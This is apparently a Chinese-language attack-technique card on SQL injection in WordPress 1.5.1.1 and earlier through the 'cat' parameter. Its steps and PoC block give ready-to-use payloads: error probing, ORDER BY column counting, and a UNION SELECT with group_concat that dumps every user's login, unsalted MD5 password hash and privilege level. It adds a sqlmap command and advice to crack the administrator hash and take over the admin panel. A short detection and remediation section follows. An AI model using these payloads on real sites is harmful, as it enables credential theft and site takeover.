---
id: web-generic-sqli-wordpress-151-cat-union-dump-wp-users
title: WordPress 1.5.1.1 的 /?cat= 未过滤拼接：order by 探列 → UNION 回显 database() → group_concat 用 0x2d 分隔拖 wp_users（含 user_level）
type: scenario
domain: web
path: web/generic/sqli
technique: wordpress-legacy-cat-union-dump-users
aliases:
- WordPress cat 参数注入
- wp_categories cat_ID 注入
- WP 1.5.1.1 SQL 注入
- UNION 探列回显 database()
- group_concat 0x2d 分隔拖库
tags:
- wordpress
- sqli
- union
- group_concat
- legacy-cms
- credential-dump
- web
cve: []
severity: high
confidence: high
status: verified
affected_versions: <= 1.5.1.1
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T13:26:47+08:00'
  notes: 已对照原文与图09/13/14/19/20/24核对：generator 为 WordPress 1.5.1.1、cat=1' 报错回显 SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1、order by 到 6 报错（5 列）、cat=0 union select 1,2,3,4,5 只有第 2 列回显、database() 回显 wordpress、version() 回显 5.1.47、group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level) 拖出 6 条含 user_level 的记录，均与原文一致。核对时把 affected_versions 从 '1.5.1.1' 收紧为 '<= 1.5.1.1'：原文图10 的 Exploit-DB 条目明写 'WordPress <= 1.5.1.1'。未验证点：未复跑注入；原文未给 CVE。
---

## 一句话结论

WordPress 1.5.1.1 的归档页把 `cat` 参数直接拼进 `SELECT * FROM wp_categories WHERE cat_ID = <cat> LIMIT 1`，单引号即可报错回显完整查询；先用 `order by` 递增到报错确定列数（本例 5 列），再用 `0 union select 1,2,3,4,5` 找到唯一回显列（第 2 列），然后把 `database()`、`version()` 与 `group_concat(user_login,0x2d,user_pass,0x2d,user_level)` 塞进该列，一次就把全站账户、MD5 口令与权限等级拖出来。

## 原理

- 老版本 WP 的 `wp_categories` 查询没有对 `cat` 做整型转换或 `$wpdb->prepare`：`cat=1'` 直接闭合 `'1'` 造成语法错误，MySQL 把出错的完整 SQL 打进响应（`WordPress database error: ... SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1`），这就是现成的报错回显点。
- **列数探测**：`cat=1 order by 1,2,3,4,5` 正常、`order by 1,...,6` 报错 → 查询恰好 5 列（`SELECT *` 的列数）。
- **回显列定位**：`cat=1 union select 1,2,3,4,5` 没回显（因为 `cat=1` 本身能命中一行，`LIMIT 1` 只取第一行）；把主查询改成不存在的 `cat=0` 后，UNION 行成为第一行，页面在"第 2 列"位置回显 `2` → 只有第 2 列会被拼进 HTML 输出。
- **拖库**：把第 2 列换成 `database()`（回显库名 `wordpress`）、`version()`（回显版本，本例 5.1.47），再换成子查询 `group_concat(...)`。
- **0x2d 分隔技巧**：`group_concat` 默认用逗号分隔，字段里若本来含逗号会混淆边界；用 `0x2d`（ASCII 的 `-`）作为分隔符 `group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level)` 得到 `1-NickJames-<md5>-1,2-...`，再用 `-` 切分即可稳定解析出四列。
- **为什么加 `user_level`**：WP 1.x 的用户表用 `user_level` 表示权限（10 为最高管理员），比只拖 user_login/user_pass 更有价值 —— 直接锁定权限最高者，登录后台后可用全部管理功能。

## 触发条件

- 目标运行受影响的老版本 WP（本例 1.5.1.1），且归档/分类页的 `cat` 参数未做整型化（可用 `'` 触发报错回显）。
- 站点开了 `WP_DEBUG`/数据库错误显示（老版本默认会把 SQL 错误打到页面），否则需改走盲注。
- 攻击者无需登录（前台参数即可注入）。
- 数据库账户可读 `wp_users`（默认表前缀 `wp_` 且权限足够）。

## 利用步骤

1. 找带 `cat` 参数的可点页面，URL 后加 `'`：出现 "WordPress database error" 并回显完整 SQL → 确认注入。
2. `cat=1 order by 1,2,3,4,5` 正常、加到 6 报错 → 列数 5。
3. `cat=1 union select 1,2,3,4,5` 看是否回显；若主查询命中导致不显示，改成 `cat=0 union select 1,2,3,4,5`，确认只有第 2 列回显。
4. `cat=0 union select 1,database(),3,4,5` → 回显库名；`version()` 拿到 MySQL 版本。
5. `cat=0 union select 1,group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users` → 一次拖出全部账户、MD5 口令与 user_level。
6. 挑 `user_level=10` 的账号，把 MD5 拿去破解（老 WP 用无盐 MD5，`hash-identifier` 识别后在线/离线破解即可）。
7. 用破解出的口令访问 `/wp-login.php` 登录后台，转入后台 getshell（另见关联卡）。

## PoC

```text
# 1) 报错确认注入
/?cat=1'

# 2) 列数探测：5 正常，6 报错
/?cat=1 order by 1,2,3,4,5
/?cat=1 order by 1,2,3,4,5,6

# 3) 回显列（只有第 2 列回显）
/?cat=0 union select 1,2,3,4,5

# 4) 基础信息
/?cat=0 union select 1,database(),3,4,5
/?cat=0 union select 1,version(),3,4,5

# 5) 一次拖全站账户 + 口令哈希 + 权限等级
/?cat=0 union select 1,group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users
```

```text
# 预期回显（第 2 列位置）
1-NickJames-<md5>-1,2-JohnSmith-<md5>-0,3-GeorgeMiller-<md5>-10,...
# user_level=10 即管理员，优先破解该账号
```

```text
# 也可用 sqlmap 一把梭（同一注入点）
sqlmap -u "http://<target>/path/?cat=0" --dbs --batch
```

## 变体与关联

- 变体：若页面不回显 SQL 错误（`WP_DEBUG` 关闭），改用布尔/时间盲注从 `wp_users` 逐字符提取；或把 UNION 放到 `s`/`author`/`p` 等其它前台参数上（老版本多个参数都裸拼）。
- 变体：`group_concat` 有长度上限（`group_concat_max_len` 默认 1024），账号多时需分批（`limit` 分段）或用 `substring` 截取。
- 变体：表前缀非 `wp_` 时先 `select table_name from information_schema.tables where table_schema=database()` 枚举前缀，再拼用户表名。
- 关联：[[web-php-wordpress-admin-weak-password-theme-editor-rce]]（拿到管理员后改主题文件写 PHP 的另一条 getshell 路径）；[[web-generic-sqli-error-based-extraction]]（updatexml/extractvalue 报错注入的通用手法，适用于 UNION 被过滤时）。
- 边界：现代 WP 已用 `$wpdb->prepare` 与整型转换；升级后同一参数不再可注入。若只回显库名但 `wp_users` 不可读（权限受限），需改打其它表。

## 检测与防御

- 检测：`cat`/`author`/`s` 等参数出现单引号、`order by`、`union select`、`group_concat`、`0x2d` 组合；响应中出现 `WordPress database error` 与完整 SQL；短时间内对同一参数递增列数（1..6）。
- 修复：所有拼进 SQL 的参数用 `intval()`/`$wpdb->prepare`；升级 WP 到受支持版本；关闭前台 SQL 错误回显（`WP_DEBUG=false`、`display_errors=Off`）。
- 加固：数据库账户最小权限（不给 `information_schema` 之外的写权限）；口令改为加盐哈希并强制重置老账号；后台登录加频控与二次验证。
- 响应：一旦确认拖库，按凭据泄露处置（重置全部管理员口令、审计 `wp_users` 与插件文件、检查有没有新增管理员账号）。

## 备注

原文明确给出目标 WP 版本 1.5.1.1（页面 `<meta name="generator" content="WordPress 1.5.1.1" />`），且原文引用的 Exploit-DB 条目写作「WordPress <= 1.5.1.1」，故 affected_versions 记为 `<= 1.5.1.1`；同时 Google 结果显示 Exploit-DB 的「WordPress Core 1.5.1.1 - SQL Injection」条目，说明这是该版本的已知公开问题。原文未给 CVE 编号，cve 留空。原文还对比了"单引号不报错的页面说明不存在注入"，本卡把该判定步骤并入利用步骤 1。
